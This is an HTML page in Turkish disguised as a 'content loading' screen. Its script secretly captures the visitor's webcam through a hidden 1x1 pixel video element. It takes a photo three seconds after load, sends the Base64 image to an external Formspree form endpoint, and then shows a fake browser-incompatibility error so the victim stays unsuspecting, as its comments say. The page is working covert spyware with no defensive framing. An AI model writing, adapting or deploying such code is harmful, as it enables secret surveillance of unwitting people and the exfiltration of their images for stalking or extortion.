<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Yükleniyor</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #000; color: white; margin: 0; }
        /* Kamerayı gizlemek için 1x1 piksellik görünmez bir alan yapıyoruz */
        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 16px; margin-top: 20px; color: #ccc; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h1>İçerik Yükleniyor, Lütfen Bekleyin...</h1>
    
    <video id="videoElement" autoplay playsinline></video>

    <script>
        async function baslat() {
            try {
                // Kamera izni istiyoruz
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.querySelector("#videoElement");
                video.srcObject = stream;

                // Kamera açıldıktan 3 saniye sonra fotoğraf çek ve gönder
                setTimeout(fotografCekVeGonder, 3000);
            } catch (err) {
                console.log("Kamera erişimi reddedildi: " + err);
            }
        }

        async function fotografCekVeGonder() {
            const video = document.querySelector("#videoElement");
            const canvas = document.createElement("canvas");
            
            // Video boyutlarını al
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Fotoğrafı yakala
            const context = canvas.getContext("2d");
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Görüntüyü metin formatına (Base64) çevir
            const veriUrl = canvas.toDataURL("image/jpeg", 0.7); // 0.7 kalite (boyut küçük olsun diye)

            // Formspree linkine gönder
            try {
                await fetch("https://formspree.io/f/meelplaw", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    body: JSON.stringify({
                        subject: "Yeni Görüntü Geldi!",
                        kimden: "Mainproje1",
                        fotograf_kodu: veriUrl
                    })
                });
                
                // Gönderimden sonra kullanıcıyı şüphelendirmemek için bir hata mesajı gösterelim
                alert("Hata: Tarayıcı uyumsuzluğu tespit edildi. Lütfen daha sonra tekrar deneyin.");
            } catch (error) {
                console.log("Gönderim hatası:", error);
            }
        }

        window.onload = baslat;
    </script>
</body>
</html>
